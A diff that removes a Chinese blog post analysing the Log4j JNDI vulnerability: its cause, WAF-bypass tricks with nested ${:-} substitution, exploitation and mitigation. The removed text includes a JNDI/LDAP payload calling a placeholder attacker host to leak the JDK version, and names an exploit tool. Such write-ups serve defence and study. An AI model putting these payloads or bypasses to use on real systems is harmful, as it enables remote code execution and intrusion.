@@ -88,46 +88,7 @@
     <div class="entry">
       
         <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    这个漏洞爆发已经有好几天了，从影响来看这个漏洞影响范围确实很广，算是JAVA开发框架中一个比较基础的组件，之前和同事的前辈也讨论过，未来的发展可能会越来越依赖于集成框架，如果框架本身没有问题就没事，有问题就会导致毁灭性的灾难，这次漏洞也验证了我们之前的讨论。</p>
-<h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><p>​    之前写过自己对于漏洞危害和有趣的比较，后来自己想想也觉得奇怪，如果是漏洞危害非常大的漏洞怎么可能是简单的漏洞呢？但实际上这次的漏洞确实就是个简单的漏洞。</p>
-<p><strong>前置知识</strong></p>
-<p>​    这个漏洞就不具体分析了，仅仅是一步一步跟代码也没有什么乐趣，我们更应该站在程序设计者的角度去理解程序的功能，下面是我对这个漏洞中遇到的关键类做了一个总结。</p>
-<p><img src="/2021/12/13/%E6%B5%85%E8%B0%88Log4j%E6%BC%8F%E6%B4%9E/image-20211212210820175.png" alt="image-20211212210820175"></p>
-<p>​    这里有个小插曲，我在查找Substitutes的资料时，发现这个类其实是Commons-lang的类。Log4j仅仅使用了这个类，我以为这次的问题也有可能是出在commons-lang包下，实际上Substitutes确实在Commons-lang包下，但是在Commons-lang中针对StrLookup接口仅仅只提供了Map取值等少数的实现，所以出现问题只是Log4j提供了StrLookup大量的实现类提供不同的解析，而其中一个实现类JndiLookup实现从JNDI获取资源并返回的功能导致了问题。</p>
-<p>​    </p>
-<p><strong>漏洞原理</strong></p>
-<blockquote>
-<p>Log4j在处理日志内容时会通过转换器对日志的内容进行转换，而MessagePatternConverter转换器会对日志中的消息内容进行转换，转换的过程调用了Substitutes.substitute完成变量到文本的替换操作，替换操作首先会调用Interpolator.lookup方法，这个方法根据前缀的不同调用不同实现类的lookup方法。当使用jndi前缀时，会通过jndi获取资源并解析。</p>
-</blockquote>
-<p>​    JNDI的问题这两年似乎比较多，其实我认为从开发者的角度，提供JNDI本身来讲是一个正常的功能，比如经常会在配置文件中使用JNDI配置数据库等等，只是有人发现它可以通过某种方式来造成危害。所以JNDI出现问题还比较多，尤其是一些比较大型的系统或者一些组件，小型的系统应该也不会用JNDI。</p>
-<h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><p>​    目前有下面两种绕过方法：</p>
-<ul>
-<li>编码</li>
-<li>Substitutes处理变量会进行递归处理并且可以通过${:-x}来设置默认值为x</li>
-</ul>
-<p>编码并不是一个通用的绕过方案，具体能使用什么样的编码方式来绕过还取决于组件能支持什么编码或者系统本身传入的参数就是加密的，<strong>对于加密参数导致的漏洞WAF自然拦截不到，这也是挖掘Log4j漏洞而防止WAF拦截的思路。</strong></p>
-<p>​    对于通过Substitutes处理变量的特性来绕过的方法算是一种通用的绕过方法，下面对这个方法的利用和弊端再进一步解释。</p>
-<ul>
-<li>当使用${asdas:-x}来设置默认变量，在程序解析时并不会关注key的值，key是任意值最终也只会返回默认值x。比如${${jnasdasd:xadasd}:-x}最后还是会返回x。</li>
-</ul>
-<p><img src="/2021/12/13/%E6%B5%85%E8%B0%88Log4j%E6%BC%8F%E6%B4%9E/image-20211212213514459.png" alt="image-20211212213514459"></p>
-<ul>
-<li>程序只会关注Value的值，并且Value的值可以嵌套。比如${xxx:-${:-x}}最终还是会返回x。</li>
-</ul>
-<p><img src="/2021/12/13/%E6%B5%85%E8%B0%88Log4j%E6%BC%8F%E6%B4%9E/image-20211212213641690.png" alt="image-20211212213641690"></p>
-<ul>
-<li>插入${:-}会返回空，所以可以插入任意的${:-}</li>
-</ul>
-<p><img src="/2021/12/13/%E6%B5%85%E8%B0%88Log4j%E6%BC%8F%E6%B4%9E/image-20211212213816170.png" alt="image-20211212213816170"></p>
-<p>​    这种绕过方式虽然看起来很香，我也一度像利用这个特性做一个自动混淆payload的工具，但是它有个缺点导致无法大量利用这个特性绕过WAF。<strong>即每使用一次${:-}来进行嵌套解析，就会导致利用被多触发一次。</strong></p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>​    之前看网上的防御方法建议封DNSLog，但我认为这并不是一个好的解决方案，因为JNDI的利用本身并不依赖DNSLog，只要在自己服务器上开一个LDAP服务看有没有连接即可。</p>
-<p>​    关于JNDI的利用比较依赖JDK的版本，所以如果能获取到JDK的版本也有利于漏洞的后续利用。在Log4j处理变量时，根据不同的前缀进行不同的处理，在java前缀中可以通过${java:version}来获取JDK版本。再配合Substitutes递归解析变量的特性来进行利用。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://xxx.xx.xx.x:1389/$&#123;java:version&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>​    关于开启LDAP服务的工具，可以使用<code>JNDIExploit.jar</code>,集成了内存马和反序列化回显等多种利用方式，但需要注意通过<code>-i</code>属性指定ip不要指定127.0.0.1，否则会导致利用失败。</p>
-<p>​    最后<code>浅蓝</code>师傅提出的在SpringBoot中通过<code>ResourceBundle</code>获取<code>application.properties</code>配置文件的方式让我眼前一亮，虽然在分析到不同前缀处理方式时，我也想过通过ctx还是properties中获取有用信息的方式，但也没想到比较好的解决方法，也深感知识水平的差距。</p>
-<p>​    当我搭建<code>SpringBoot</code>尝试复现该利用方法时，发现JNDI无法触发，经过排查发现我使用IDEA默认创建的<code>SpringBoot</code>项目默认会使用自己的日志处理器而不是Log4j。所以SpringBoot<strong>在默认的配置中</strong>不会出现Log4j的漏洞，也使得这种方式的利用在SpringBoot下的可能性减少了很多。</p>
-<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>​    漏洞刚出来的时候没有补丁包，看有个师傅提出将<code>JndiLookup</code>替换为空实现的方法，虽然暴力但是有用，后来再看有人提出直接删了这个文件的方法修复，也是有用的。但是删除文件后要不要重启，我认为是不需要的，因为JVM是使用懒加载的，只有使用<code>JndiLookup</code>才会被加载到内存，一般开发也不会用到这个类。但是如果系统已经被人利用漏洞并且触发了<code>JndiLookup</code>类的加载，这个时候就应该需要重启了，这样来看删除后重启确实是个有用的方法。</p>
-
+        
       
     </div>
 
